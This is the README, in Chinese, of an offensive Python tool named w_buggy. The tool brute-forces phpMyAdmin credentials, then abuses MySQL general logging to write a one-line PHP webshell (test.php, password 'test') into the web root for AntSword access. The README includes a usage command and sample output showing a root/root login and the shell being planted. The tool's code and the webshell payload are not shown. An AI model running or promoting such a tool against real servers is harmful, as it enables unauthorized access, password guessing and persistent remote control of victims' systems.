# w_buggy
phpmyadmin密码爆破并利用mysql日志写一句话shell  
#
w_buggy名称由来,小丑 巴基 (バギー Bagī?, Buggy) 是巴基海贼团船长。四分五裂果实的能力者，四分五裂人，身体可以分裂，操控各个部分飞向敌人攻击，斩击对其无效。使用武器为八把水果刀。 有着一个大红鼻子跟屁股，外形像小丑，他很忌讳别人谈及他的鼻子，也因为如此常常发狂及伤及无辜。口头禅是“ハデに -”，出海的梦想是得到世间的财宝并成为海贼王。  
![](buggy.jpg)
```text
像个二逼似的
```

w_buggy_asynchronous.py 异步版本  
w_buggy_synchronize.py 异步版本
# 
#### 支持phpmyadmin版本
Version 3.5.8.2  
虚拟机里的环境动不动就死了。。。,协程控制到2个任务,慢的蜗牛一样
#### 运行环境
linux, >=python3.7

#### 一句话木马路径
当前默认为www目录下的test.php,密码默认为test,使用蚁剑连接
#### 运行
```shell script
(venv) [root@localhost w_buggy]# python w_buggy_asynchronous.py http://192.168.52.143 -t 2
开始扫描时间2021-01-22 20:02:22
登录成功:用户名为root,密码为root
日志开关已打开
日志路径设置成功
开始写入一句话木马
一句话木马路径: http://192.168.52.143/test.php,密码test,请使用蚁剑连接
扫描完成时间2021-01-22 20:02:28, 扫描耗时:0分钟
```
#
![](gzh.jpg)
